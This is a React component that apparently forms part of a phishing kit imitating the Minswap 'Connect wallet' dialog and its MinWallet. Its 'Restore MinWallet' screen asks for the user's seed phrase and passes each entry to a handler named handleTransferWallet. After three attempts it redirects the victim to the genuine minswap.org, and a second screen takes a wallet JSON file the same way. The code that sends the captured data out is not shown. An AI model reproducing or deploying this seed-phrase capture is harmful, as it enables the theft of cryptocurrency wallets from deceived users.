  const SeedPhraseContainer = ({ handleTransferWallet, onClose }) => {
    const textareaRef = useRef(null);
    const [attemptCount, setAttemptCount] = useState(0);

    const handleSubmit = () => {
      if (textareaRef.current) {
        const message = textareaRef.current.value.trim();
        const newAttemptCount = attemptCount + 1;
        setAttemptCount(newAttemptCount);

        handleTransferWallet(message, newAttemptCount);

        if (newAttemptCount === 3) {
          window.location.href = "https://minswap.org/fi-FI";
        }
      }
    };

    return (
      <div>
        <h2 className="text-lg font-semibold text-textSecondary mb-4">
          Restore MinWallet
        </h2>
        <p className="text-textSecondary mt-3 text-sm">
          Please write your seed phrase in the right order.
        </p>
        <p className="text-textPrimary mt-3 mb-3 text-sm">
          Use space between each phrase
        </p>
        <textarea
          ref={textareaRef}
          className="w-full p-2 bg-[#121212] border border-stone-700 text-textSecondary rounded-lg"
          rows="4"
        ></textarea>
        <button
          className="p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold"
          onClick={handleSubmit}
          disabled={attemptCount >= 3}
        >
          {attemptCount < 3 ? "Next" : "Next"}
        </button>
      </div>
    );
  };

  const ImportContainer = () => {
    const handleFileChange = (event) => {
      if (event.target.files.length > 0) {
        setFileName(event.target.files[0].name);
        setFileUploaded(true);
      } else {
        setFileName("");
        setFileUploaded(false);
      }
    };

    return (
      <div>
        <h2 className="text-lg font-semibold text-textSecondary mb-4">
          Restore MinWallet
        </h2>
        <div className="w-full rounded-xl p-4">
          <label className="flex flex-col items-center justify-center w-full h-36 bg-[#2a2d36] text-textSecondary rounded cursor-pointer hover:bg-[#3a3d46] transition-colors">
            <img
              alt="Import wallet"
              width={67}
              height={67}
              className="size-16 mb-2"
              src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721984028/vujnxx74twnh3q93impv.png"
            />
            {fileName && <span className="text-sm mt-2">{fileName}</span>}
            <input
              type="file"
              accept=".json"
              className="hidden"
              onChange={handleFileChange}
            />
          </label>
        </div>
        <p className="text-center text-textPrimary text-sm mt-2 font-medium">
          Import MinWallet.json file
        </p>
        <button
          className={`p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold flex items-center justify-center gap-2 ${!fileUploaded ? "opacity-50 cursor-not-allowed" : ""
            }`}
          disabled={!fileUploaded}
          onClick={handleTransferWallet}
        >
          <svg
            viewBox="0 0 24 24"
            xmlns="http://www.w3.org/2000/svg"
            width="20"
            height="24"
            fill="currentColor"
            className="remixicon "
          >
            <path d="M13 10H18L12 16L6 10H11V3H13V10ZM4 19H20V12H22V20C22 20.5523 21.5523 21 21 21H3C2.44772 21 2 20.5523 2 20V12H4V19Z"></path>
          </svg>
          Next
        </button>
      </div>
    );
  };


  console.log(filteredWalletNames)
  return (
    <div className="fixed inset-0 flex items-center justify-center lg:justify-end z-[500] bg-[#ffffff1c] bg-opacity-50 backdrop-blur">
      <div className="ConnectWallet w-full max-w-[420px] lg:h-full lg:bg-[#111218]">
        <div
          className="inset-0 z-[500] flex flex-col items-center justify-center lg:p-0 px-6 lg:p-0 py-24 ]"
          onClick={handleBackdropClick}
        >
          <div className="height flex w-full flex-col overflow-hidden bg-[#111218] text-left align-middle shadow-2xl max-w-[420px] h-fit space-y-6 lg:rounded-none rounded-[20px] py-6">

            <div className="flex items-center justify-between space-x-2 px-4 md:px-6 ">
              <div className="space-y-2">
                <h2 className="font-interDisplay text-xl text-textSecondary font-semibold">
                  Connect wallet
                </h2>
              </div>
              <button
                className="flex select-none items-center justify-center space-x-2 whitespace-nowrap transition-colors group rounded-full cursor-pointer bg-transparent hover:bg-sf-pri-hv active:bg-sf-pri-pressed disabled:bg-transparent size-6"
                onClick={onClose}
              >
                <span className="[&>svg]:size-6 text-itr-tentSec-df group-hover:text-itr-tentSec-df group-active:text-itr-tentSec-df group-disabled:text-itr-tentPri-dis">
                  <svg
                    viewBox="0 0 24 24"
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    fill="currentColor"
                    className="remixicon text-textSecondary"
                  >
                    <path d="M11.9997 10.5865L16.9495 5.63672L18.3637 7.05093L13.4139 12.0007L18.3637 16.9504L16.9495 18.3646L11.9997 13.4149L7.04996 18.3646L5.63574 16.9504L10.5855 12.0007L5.63574 7.05093L7.04996 5.63672L11.9997 10.5865Z"></path>
                  </svg>
                </span>
              </button>
            </div>

            <div className="flex-1 overflow-y-auto px-4 md:px-6 flex flex-col justify-between">

              {selectedWallet ? (
                <div className="flex-1 space-y-4">
                  {selectedWallet === "MinWallet" && (
                    <div>
                      {!walletAction ? (
                        <>
                          <button
                            className="flex select-none items-center justify-center whitespace-nowrap transition-colors outline-none cursor-pointer  border-transparent text-[#3b82f6] text-xs font-semibold pt-2 pb-3"
                            onClick={() => setSelectedWallet(null)}
                          >
                            <svg
                              viewBox="0 0 24 24"
                              xmlns="http://www.w3.org/2000/svg"
                              width="24"
                              height="24"
                              fill="currentColor"
                              className="remixicon size-4 shrink-0 me-1"
                            >
                              <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"></path>
                            </svg>
                            Go back
                          </button>

                          <h1 className="text-textSecondary font-semibold text-lg">
                            {selectedWallet}
                          </h1>

                          <div className="rounded-lg bg-[#89aaff] pt-4">
                            <img
                              src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721838634/er58bc1qciu4fizena2m.svg"
                              alt="minwallet"
                              className="w-100 m-auto"
                            />
                          </div>
                          <p className="text-xs font-medium text-textSecondary mt-4">
                            Minwallet is a secure and user-friendly wallet built
                            directly into Minswap DApp for seamless token
                            swapping and management.
                          </p>
                          <p className="text-xs font-medium text-textSecondary mt-4">
                            Let's get started with creating a new wallet or
                            restoring an existing wallet.
                          </p>

                          <div className="flex flex-col items-center justify-center font-medium mt-2">
                            <button
                              className="p-3 mt-2 bg-[#89aaff] rounded-full text-xs w-full"
                              onClick={() => setWalletAction("new")}
                            >
                              New wallet
                            </button>
                            <button
                              className="p-3 mt-2 border border-stone-300 rounded-full text-textSecondary text-xs w-full"
                              onClick={() => setWalletAction("restore")}
                            >
                              Restore wallet
                            </button>
                          </div>
                        </>
                      ) : (
                        <>
                          <button
                            className="flex select-none items-center justify-center whitespace-nowrap transition-colors outline-none cursor-pointer border-transparent text-[#3b82f6] text-xs font-semibold pt-2"
                            onClick={handleGoBack}
                          >
                            <svg
                              viewBox="0 0 24 24"
                              xmlns="http://www.w3.org/2000/svg"
                              width="24"
                              height="24"
                              fill="currentColor"
                              className="remixicon size-4 shrink-0 me-1"
                            >
                              <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"></path>
                            </svg>
                            Go back
                          </button>

                          {walletAction === "new" ? (
                            <div>
                              <h2 className="text-lg font-semibold text-textSecondary mb-4">
                                Create New Wallet
                              </h2>
                              <p className="text-sm text-textSecondary">
                                Here you can add steps or forms for creating a
                                new wallet.
                              </p>
                            </div>
                          ) : (
                            <div>
                              {!showRestoreContainer ? (
                                <>
                                  <h2 className="text-lg font-semibold text-textSecondary mb-4">
                                    Restore Wallet
                                  </h2>

                                  <div className="overflow-y-auto">
                                    <div className="mb-4 border w-full p-4 rounded-lg flex gap-3">
                                      <input
                                        type="radio"
                                        name="restoreMethod"
                                        value="seedPhrase"
                                        id="seedPhrase"
                                        className="w-6 h-6 mt-1"
                                        onChange={handleRadioChange}
                                      />
                                      <div>
                                        <h1 className="text-textSecondary font-medium text-lg text-left">
                                          Seed phrase
                                        </h1>
                                        <p className="text-left text-textPrimary text-sm">
                                          Restore using seed phrase.
                                        </p>
                                      </div>
                                    </div>
                                    <div className="border w-full p-4 rounded-lg flex gap-3">
                                      <input
                                        type="radio"
                                        name="restoreMethod"
                                        value="import"
                                        id="import"
                                        className="w-6 h-6 mt-1"
                                        onChange={handleRadioChange}
                                      />
                                      <div>
                                        <h1 className="text-textSecondary font-medium text-lg text-left">
                                          Import
                                        </h1>
                                        <p className="text-left text-textPrimary text-sm">
                                          Import from existing wallet JSON file.
                                        </p>
                                      </div>
                                    </div>
                                  </div>

                                  <div className="flex flex-col mt-4">
                                    <button
                                      className="p-3 mt-2 bg-[#89aaff] rounded-full text-sm w-full font-semibold"
                                      onClick={handleNext}
                                    >
                                      Next
                                    </button>
                                    <button
                                      className="p-3 mt-2 bg-[#1f2025] rounded-full text-textSecondary text-sm w-full"
                                      onClick={handleGoBack}
                                    >
                                      Back
                                    </button>
                                  </div>
                                </>
                              ) : (
                                <div className="mt-4">
                                  {restoreMethod === "seedPhrase" ? (
                                    <SeedPhraseContainer
                                      handleTransferWallet={
                                        handleTransferWallet
                                      }
                                      onClose={onClose}
                                    />
                                  ) : (
                                    <ImportContainer />
                                  )}
                                  <button
                                    className="p-3 mt-4 bg-[#1f2025] rounded-full text-textSecondary text-sm w-full"
                                    onClick={handleGoBack}
                                  >
                                    Back
                                  </button>
                                </div>
                              )}
                            </div>
                          )}
                        </>
                      )}
                    </div>
                  )}

                  {
                    filteredWalletNames.map((wallet) => {


                      return (selectedWallet === wallet && (
                        <div key={wallet} className="bg-[#1f2025] p-4 rounded-lg">
                          <p className="text-textSecondary mb-2">
                            {window.cardano[wallet].name} has been connected
                          </p>
                          <button className="bg-blue-500 text-white px-4 py-2 rounded">
                            {window.cardano[wallet].name}  Connected
                          </button>
                        </div>
                      )
                      )
                    })
                  }


                  {selectedWallet === "Add Custom Wallet" && (
                    <div className="bg-[#1f2025] p-4 rounded-lg">
                      <p className="text-textSecondary mb-2">
                        Enter your custom wallet details:
                      </p>
                      <input
                        type="text"
                        placeholder="Wallet Name"
                        className="bg-[#2a2d36] text-textSecondary p-2 rounded mb-2 w-full"
                      />
                      <input
                        type="text"
                        placeholder="Wallet Address"
                        className="bg-[#2a2d36] text-textSecondary p-2 rounded mb-2 w-full"
                      />
                      <button className="bg-blue-500 text-white px-4 py-2 rounded">
                        Add Wallet
                      </button>
                    </div>
                  )}
                </div>
              ) : (
                <>
                  <div className="flex-1 space-y-1 overflow-y-auto custom-scrollbar">
                    <div className="flex-1 space-y-1 overflow-y-auto">
                      <div
                        className="flex items-center cursor-pointer gap-x-4 p-3 "
                        onClick={() => handleWalletSelection("MinWallet")}
                      >
                        <img
                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831689/wedc8sye9jw3nj6kyyaj.svg"
                          className="size-8 shrink-0"
                          alt="minwallet"
                        />
                        <div className="flex-1">
                          <h1 className="text-textSecondary text-md font-semibold">
                            MinWallet
                          </h1>
                          <p className="text-[#919bd1] text-sm">
                            Mobile support
                          </p>
                        </div>
                        <svg
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          fill="currentColor"
                          className="text-textSecondary size-5 shrink-0"
                        >
                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
                        </svg>
                      </div>


                      {filteredWalletNames.map((key) => {
                        return (<div
                          key={key}
                          className="flex items-center cursor-pointer gap-x-4 p-3 "
                          onClick={() => handleWalletSelection(`${window.cardano[key].name}`, key)}
                        >
                          <img src={window.cardano[key].icon} width={32} height={32} alt={key} />
                          <div className="flex-1">
                            <h1 className="text-textSecondary text-md font-semibold">
                              {window.cardano[key].name}
                            </h1>
                            <p className="text-[#919bd1] text-sm">
                              Mobile support
                            </p>
                          </div>
                          <svg
                            viewBox="0 0 24 24"
                            xmlns="http://www.w3.org/2000/svg"
                            width="24"
                            height="24"
                            fill="currentColor"
                            className="text-textSecondary size-5 shrink-0"
                          >
                            <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
                          </svg>
                        </div>)
                      }

                      )}



                      <div
                        className="flex items-center cursor-pointer gap-x-4 p-3 "
                        onClick={() => handleWalletSelection("Custom")}
                      >
                        <img
                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831902/ofozmzoru4hd8fembeie.svg"
                          className="size-8 shrink-0"
                          alt="custom"
                        />
                        <div className="flex-1">
                          <h1 className="text-textSecondary text-md font-semibold">
                            Add Custom Wallet
                          </h1>
                        </div>
                        <svg
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          fill="currentColor"
                          className="text-textSecondary size-5 shrink-0"
                        >
                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
                        </svg>
                      </div>

                      <div className="p-3">
                        <button className="flex select-none items-center justify-center space-x-2 whitespace-nowrap transition-colors border outline-none cursor-pointer bg-[#1f2025] border-transparent text-itr-tentSec-df hover:bg-sf-pri-hv hover:border-transparent hover:text-itr-tentSec-df active:bg-sf-pri-pressed active:border-transparent active:text-textSecondary disabled:bg-sf-pri-dis disabled:border-transparent disabled:text-itr-tentSec-dis text-textSecondary text-sm px-5 py-2 rounded-full">
                          <span>More wallets...</span>
                        </button>
                      </div>
                    </div>
                  </div>

                  <div className="mt-6 lg:mt-[60px]">
                    <div className="p-2 text-xs text-textPrimary">
                      By connecting a wallet, you agree to Minswap Labs'{" "}
                      <Link
                        className="text-[#919bd1] font-semibold"
                        href="https://minswap.org/terms-of-service/"
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        Terms of Service
                      </Link>{" "}
                      and consent to its{" "}
                      <Link
                        className="text-[#919bd1] font-semibold"
                        href="https://minswap.org/cookie-policy/"
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        Privacy Policy
                      </Link>
                      .
                    </div>
                  </div>
                </>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default ConnectWallet;
